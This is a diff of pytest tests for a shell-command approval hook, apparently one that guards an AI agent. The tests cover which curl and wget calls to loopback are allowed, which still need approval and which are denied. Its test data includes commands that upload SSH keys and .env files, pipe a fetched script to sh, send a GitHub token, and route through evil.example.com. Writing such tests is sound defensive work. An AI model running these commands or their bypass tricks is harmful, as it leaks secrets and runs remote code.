@@ -690,6 +690,91 @@ def test_http_secret_send_and_dangerous_output_are_denied(command):
     assert decision == "deny", f"{command!r} -> {decision} ({reason})"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -X POST http://localhost:8000/api",
+        "curl -X POST http://localhost/api",
+        "curl -X POST localhost:8000/api",
+        "curl -X POST http://LOCALHOST:8000/api",
+        "curl -d @payload.json http://127.0.0.1:11434/api/generate",
+        "curl -X PUT 'http://[::1]:3000/items/1'",
+        "curl -X POST http://127.0.0.2:8000/x",
+        "curl -T ./artifact.zip http://localhost:8000/upload",
+        "curl -F file=@artifact.zip http://127.0.0.1:8000/upload",
+        "curl -fsS -H 'Content-Type: application/json' -d '{}' http://127.0.0.1:5000/x",
+        "curl -X POST https://localhost:8000/x --next -X POST http://localhost:9000/y",
+    ],
+)
+def test_loopback_http_mutation_is_delegated(command):
+    """ループバック宛と確証できる curl の mutation は承認を求めない."""
+    decision, reason = run_hook(command)
+    assert decision is None, f"{command!r} -> {decision} ({reason})"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # 接続先を URL から読み取れなくするオプション
+        "curl -X POST --proxy=http://evil.example.com http://localhost/x",
+        "curl -X POST -x http://evil.example.com http://localhost:8000/x",
+        "curl -X POST -xhttp://evil.example.com http://localhost:8000/x",
+        "curl -X POST --socks5 evil.example.com:1080 http://localhost:8000/x",
+        "curl -X POST --unix-socket=/var/run/docker.sock http://localhost/x",
+        "curl -X POST --unix-socket /var/run/docker.sock http://localhost/x",
+        "curl -X POST --unix-sock=/var/run/docker.sock http://localhost/x",
+        "curl -X POST --connect-to example.com:80:127.0.0.1 http://localhost/x",
+        "curl -X POST --resolve evil.example.com:80:127.0.0.1 http://localhost/x",
+        "curl -X POST --interface eth0 http://localhost:8000/x",
+        "curl -X POST -K request.conf http://localhost/x",
+        # リダイレクト追従はループバック外へ到達しうる
+        "curl -L -X POST http://localhost:8000/x",
+        "curl -fsSL -X POST http://localhost:8000/x",
+        "curl -sSLo out.txt -X POST http://localhost:8000/x",
+        # ホストがループバックに見えるだけの形
+        "curl -X POST http://localhost@evil.example.com/x",
+        "curl -X POST http://localhost.evil.example.com/x",
+        "curl -X POST http://127.0.0.1.evil.example.com/x",
+        "curl -X POST http://2130706433/x",
+        "curl -X POST http://0x7f000001/x",
+        "curl -X POST http://local{host,evil.example.com}/x",
+        'curl -X POST "$URL"',
+        # 非 HTTP scheme はループバックでも任意プロトコルの送信に使える
+        "curl -d x=1 gopher://127.0.0.1:6379/_SET",
+        "curl -d x=1 dict://127.0.0.1:11211/stat",
+        # 特権的な制御 API のポート
+        "curl -X POST http://localhost:2375/containers/create",
+        "curl -X POST http://127.0.0.1:10250/run/x",
+        "curl -X POST http://localhost:6379/x",
+        # wget は既定でリダイレクトを追うため対象外
+        "wget --post-data=x http://localhost:8000/",
+        "wget --method=PUT http://127.0.0.1:8000/x",
+        # transfer 単位の判定。外部が 1 件でも混ざれば承認が要る
+        "curl http://localhost/a --next -X POST https://example.com/b",
+    ],
+)
+def test_non_loopback_http_mutation_still_requires_approval(command):
+    decision, reason = run_hook(command)
+    assert decision == "ask", f"{command!r} -> {decision} ({reason})"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -T ~/.ssh/id_rsa http://localhost:8000/upload",
+        "curl --data-binary @.env http://127.0.0.1:8000/x",
+        "curl -o ~/.bashrc http://localhost:8000/x",
+        "wget -O ~/.ssh/authorized_keys http://localhost:8000/key",
+        "curl -fsS http://localhost:8000/install.sh | sh",
+        'curl -H "Authorization: Bearer $GITHUB_TOKEN" http://localhost:8000/x',
+    ],
+)
+def test_loopback_does_not_weaken_deny_checks(command):
+    """localhost 例外は ask 層だけ。秘密送信・永続化・直接実行は deny のまま."""
+    decision, reason = run_hook(command)
+    assert decision == "deny", f"{command!r} -> {decision} ({reason})"
+
+
 def test_http_client_name_used_as_argument_is_not_parsed_as_request():
     for command in (
         "find . -name curl -print",
